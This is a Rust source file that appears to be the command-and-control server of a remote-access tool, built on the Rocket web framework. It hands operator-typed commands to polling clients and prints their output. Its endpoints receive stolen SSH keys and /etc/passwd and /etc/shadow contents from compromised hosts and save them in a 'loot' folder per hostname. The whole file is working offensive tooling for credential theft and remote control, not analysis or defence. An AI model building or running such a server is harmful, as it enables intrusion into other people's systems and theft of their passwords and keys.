#[macro_use]
extern crate rocket;

use rocket::tokio;
use rocket::{data::ToByteUnit, Data};
use std::{io, fs, fs::File};

#[get("/")]
fn index() -> &'static str {
    "Web interface in development, not yet implemented, please use the command line client"
}
#[post("/command", format = "plain", data = "<data>")]
async fn command_post(data: Data<'_>) -> std::io::Result<()> {
    data.open(512.megabytes())
        .stream_to(tokio::io::stdout())
        .await?;

    Ok(())
}
#[get("/command")]
fn command() -> String {
    let mut command = String::new();
    io::stdin().read_line(&mut command).expect("error: unable to read user input");
    format!("{}", command)
}
#[post("/post/<hostname>/ssh", format = "plain", data = "<data>")]
async fn ssh(data: Data<'_>, hostname: String) -> std::io::Result<()> {
    let file_location = format!("loot/{}/ssh", hostname);
    let dir = format!("loot/{}", hostname);
    fs::create_dir_all(&dir).ok();
    println!("The dir created is {}.", &dir);
    let mut _file = File::create(&file_location)?;
    let _stream = data.open(1.megabytes()).into_file(file_location).await?;
    Ok(())
}
#[post("/post/<hostname>/passwd", format = "plain", data = "<data>")]
async fn passwd(data: Data<'_>, hostname: String) -> std::io::Result<()> {
    //create directory and declare location for the passwd file
    let file_location = format!("loot/{}/passwd", hostname);
    println!("File location is {}.", file_location);

    let dir = format!("loot/{}", hostname);
    fs::create_dir_all(&dir).ok();
    println!("The dir created is {}.", &dir);

    let mut _file = File::create(&file_location)?;
    let _stream = data.open(1.megabytes()).into_file(file_location).await?;

    Ok(())
}

#[post("/post/<hostname>/shadow", format = "plain", data = "<data>")]
async fn shadow(data: Data<'_>, hostname: String) -> std::io::Result<()> {
    let file_location = format!("loot/{}/shadow", hostname);

    let dir = format!("loot/{}", hostname);
    fs::create_dir_all(&dir).ok();

    let mut _file = File::create(&file_location)?;
    let _stream = data.open(1.megabytes()).into_file(file_location).await?;
    Ok(())
}

#[launch]
fn rocket() -> _ {
    fs::create_dir_all("loot").ok();

    rocket::build().mount("/", routes![index, passwd, shadow, command, ssh, command_post])
}
//
